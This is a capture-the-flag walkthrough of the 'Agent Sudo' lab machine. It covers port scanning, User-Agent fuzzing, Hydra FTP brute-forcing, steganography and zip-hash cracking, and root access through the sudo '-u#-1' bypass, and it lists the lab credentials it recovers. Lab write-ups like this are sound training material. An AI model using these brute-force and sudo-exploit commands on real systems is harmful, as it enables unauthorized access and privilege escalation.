# Agent Sudo
## Machine Info
This CTF challange contains various requirements such as enumerate, hash cracking, steganography, exploit, brute-force and privilege escalation.

## Used Tools
* Nmap
* Burp Suite
* Hydra
* Stegseek
* JohnTheRipper
* Binwalk


### *Enumeration*
Starting with nmap scan:
>nmap -sV -sC 10.10.245.148 -oN ./nmap_top-ports.txt

```markdown
Nmap 7.92 scan initiated Sun Feb 27 15:02:36 2022 as: nmap -sV -sC -oN ./nmap_top-ports.txt 10.10.245.148
Nmap scan report for 10.10.245.148
Host is up (0.079s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We have a http service running on port 80. Heading to http://MACHINE_IP such a page welcomes us saying we should use our 'codename' as user-agent in order to access the site.

![](https://i.imgur.com/aT61nkV.png)


For this reason, I've launched Burp Suite, changed the proxy and catch the get request to website. I thought that if there is an agent named 'Agent R', I should generate a payload by changing user-agent field in alphabetical order.

Thus, I sent this request to Intruder and added position to the User-Agent and chose Sniper attack type with a view to get any interesting response:

![](https://i.imgur.com/RolzHiJ.png)


I quickly generated a payload by typing every letter and started attack:

![](https://i.imgur.com/SXXEYR7.png)


And we got 2 interesting responses! First one is R, so change the user-agent to R and forward the remaining request:

![](https://i.imgur.com/M1YrHch.png)


Looks like this was not the response we should've wanted.. Let's catch the request and send by changing user-agent to C:

![](https://i.imgur.com/K23M0qF.png)

It forwarded us to another page http://MACHINE_IP/agent_C_attention.php . Here we see that there is another agent with codename J and a guy named chris. I think we got what we want!


### *Obtaining Foothold*

I've quickly used hydra tool to bruteforce on ssh but couldn't find anything. Though we know that there is a ftp service running on port 21 so let's try to bruteforce:
>hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://MACHINE_IP -o hydra_ftp.txt

```white
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-27 16:10:52
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.245.148:21/
[21][ftp] host: 10.10.245.148   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-27 16:12:02
```

Here it is! We found the credentials of chris. Enter to the ftp service and quickly check what's inside:
>ftp MACHINE_IP

![](https://i.imgur.com/ftWv8gs.png)


There's an interesting text file. Let's get it to our local computer by typing ```get To_agentJ.txt``` and exit. Checking what's inside:

![](https://i.imgur.com/LBK91zd.png)


It seems like we should log back to ftp session and get the jpg files too.. 


### *Steganography*

Looks like we're dealing with steganography. Let's use the stegseek tool to crack the jpg file:
>stegseek cute-alien.jpg

```white
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Area51"           
[i] Original filename: "message.txt".
[i] Extracting to "cute-alien.jpg.out".

```

![](https://i.imgur.com/tb79DNe.png)



We found the password of james! Although we should look for what cutie.png hides to get the flags..

Analyzing cutie.png via binwalk tool and extracting what's inside, we found a zip file 8702.zip:
>binwalk -e cutie.png

```white
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

![](https://i.imgur.com/npiJsRJ.png)

When we get in to the extracted directory, we can't see what To_agentR.txt contains.

Now let's use zip2john tool and after that crack the hash to find the zip's password:
>zip2john 8702.zip > hash.txt
>john hash.txt -w /usr/share/wordlists/rockyou.txt

```white
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with wordlist:/usr/share/john/password.lst
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2022-02-27 16:54) 5.882g/s 20858p/s 20858c/s 20858C/s 123456..sss
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```


We found out that the zip's password is 'alien'. Now extract what's inside of zip file by:
>7zip x 8702.zip

```white
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx   (810F81),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 07:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 07:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y

                    
Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280
```


It seems like To_agentR.txt file is been restored now! Let's see what's inside:

![](https://i.imgur.com/YDXa0JS.png)


We found an interesting location(?) that I assume it's encoded to base64. Decoding by using ```base64 -d``` command:

![](https://i.imgur.com/eGEaPJo.png)


Now that since we got the flags, head to the james's ssh session by using the credentials we found before. By typing a quick 'ls -la' command, we found the user_flag.txt:

![](https://i.imgur.com/wXZOZg3.png)


While I look at the other things that we've seen by listing, I see there's another picture called 'Alien_autospy.jpg'. 

By launching a http server on james's ssh session with ```python3 -m http.server```. I got the picture by ```wget http://MACHINE_IP:8000/Alien_autospy.jpg``` and made a quick Google search with this image. I found out that this image was a famous incident called 'Roswell Alien Autospy'. 

![](https://i.imgur.com/VCvOI1q.png)


### *Privilege Escalation* 
Going back to our ssh session, we should find the other flags by escalating our privileges. We easily find a way by typing a quick 'sudo -l' !

![](https://i.imgur.com/rug46xD.png)


But we couldn't just type 'sudo /bin/bash' since we have !root thing. After a quick research, we found an exploit that can be run on sudo versions before 1.8.28:

![](https://i.imgur.com/xBIqDuR.png)


By typing ```sudo -V```, we found out that our version is vulnerable to this exploit! And in order to use this exploit we should type the following:
>sudo -u#-1 /bin/bash

![](https://i.imgur.com/IroqnYj.png)


Now that we are the root, let's get the flag! 

![](https://i.imgur.com/envmkHv.png)
